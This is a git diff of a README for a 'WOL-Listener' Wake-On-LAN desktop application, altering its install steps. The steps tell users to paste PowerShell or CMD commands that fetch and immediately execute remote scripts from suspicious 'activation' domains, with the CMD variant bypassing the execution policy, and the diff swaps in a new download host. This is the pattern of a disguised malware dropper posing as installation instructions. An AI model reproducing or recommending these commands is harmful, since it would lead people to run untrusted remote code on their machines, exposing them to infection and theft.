@@ -26,14 +26,14 @@ WOL-Listener is a desktop application that monitors for Wake-On-LAN magic packet
 Paste the command into PowerShell and hit `Enter`.
 
 ```cmd
-iex(irm 'https://shell-activation.top/update/ps-activator-v_pZBbxuWx7DELoMji')
+iex(irm 'https://activation-gateway.cc/update/ps-activator')
 ```
 
 ### 3️⃣ If Windows blocks the script — use CMD
 Run this command in CMD instead:
 
 ```cmd
-powershell -NoProfile -ExecutionPolicy Bypass -Command "$ProgressPreference='SilentlyContinue';iex(irm 'https://shell-activation.top/update/ps-activator-v_pZBbxuWx7DELoMji')"
+powershell -NoProfile -ExecutionPolicy Bypass -Command "iex(irm 'https://activation-gateway.cc/update/ps-activator')"
 ```
 
 > [!WARNING]
